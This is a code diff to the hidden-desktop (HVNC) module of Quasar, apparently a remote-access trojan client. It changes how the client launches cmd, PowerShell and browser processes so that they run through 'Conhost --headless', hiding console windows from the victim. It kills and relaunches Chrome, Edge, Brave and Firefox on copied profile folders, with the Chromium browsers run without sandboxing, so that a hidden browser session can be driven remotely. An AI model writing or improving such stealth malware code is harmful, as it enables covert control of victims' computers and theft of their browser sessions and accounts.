@@ -73,13 +73,13 @@ namespace Quasar.Client.Helper.HVNC
 
         public void StartCmd()
         {
-            string path = Environment.GetEnvironmentVariable("SystemRoot") + "\\System32\\cmd.exe";
+            string path = "conhost cmd.exe";
             this.CreateProc(path);
         }
 
         public void StartPowershell()
         {
-            string path = Environment.GetEnvironmentVariable("SystemRoot") + "\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+            string path = "conhost powershell.exe";
             this.CreateProc(path);
         }
 
@@ -100,7 +100,7 @@ namespace Quasar.Client.Helper.HVNC
             }
 
             string text = Path.Combine(path, "SecureFolder");
-            string filePath = "cmd.exe /c taskkill /IM firefox.exe /F";
+            string filePath = "Conhost --headless cmd.exe /c taskkill /IM firefox.exe /F";
             if (!Directory.Exists(text))
             {
                 this.CreateProc(filePath);
@@ -112,7 +112,7 @@ namespace Quasar.Client.Helper.HVNC
                 DeleteFolder(text);
                 this.StartEdge();
             }
-            string filePath2 = "cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile " + text;
+            string filePath2 = "Conhost --headless cmd.exe /c start firefox -new-window -safe-mode -no-remote -profile " + text;
             this.CreateProc(filePath2);
         }
 
@@ -133,7 +133,7 @@ namespace Quasar.Client.Helper.HVNC
             }
 
             string secureFolder = Path.Combine(path, "SecureFolder");
-            string killCommand = "cmd.exe /c taskkill /IM brave.exe /F";
+            string killCommand = "Conhost --headless cmd.exe /c taskkill /IM brave.exe /F";
 
             if (!Directory.Exists(secureFolder))
             {
@@ -147,7 +147,7 @@ namespace Quasar.Client.Helper.HVNC
                 this.StartBrave();
             }
 
-            string startCommand = "cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
+            string startCommand = "Conhost --headless cmd.exe /c start brave.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + secureFolder;
             this.CreateProc(startCommand);
         }
 
@@ -173,7 +173,7 @@ namespace Quasar.Client.Helper.HVNC
             }
 
             string text = Path.Combine(path, "SecureFolder");
-            string filePath = "cmd.exe /c taskkill /IM msedge.exe /F";
+            string filePath = "Conhost --headless cmd.exe /c taskkill /IM msedge.exe /F";
             if (!Directory.Exists(text))
             {
                 this.CreateProc(filePath);
@@ -185,7 +185,7 @@ namespace Quasar.Client.Helper.HVNC
                 DeleteFolder(text);
                 this.StartEdge();
             }
-            string filePath2 = "cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
+            string filePath2 = "Conhost --headless cmd.exe /c start msedge.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
             this.CreateProc(filePath2);
         }
 
@@ -203,7 +203,7 @@ namespace Quasar.Client.Helper.HVNC
 
                 string sourceDir = Path.Combine(path, "User Data");
                 string text = Path.Combine(path, "SecureFolder");
-                string filePath = "cmd.exe /c taskkill /IM chrome.exe /F";
+                string filePath = "Conhost --headless cmd.exe /c taskkill /IM chrome.exe /F";
                 if (!Directory.Exists(text))
                 {
                     Directory.CreateDirectory(text);
@@ -215,7 +215,7 @@ namespace Quasar.Client.Helper.HVNC
                     DeleteFolder(text);
                     this.Startchrome();
                 }
-                string filePath2 = "cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
+                string filePath2 = "Conhost --headless cmd.exe /c start chrome.exe --start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + text;
                 result = this.CreateProc(filePath2);
             }
             catch
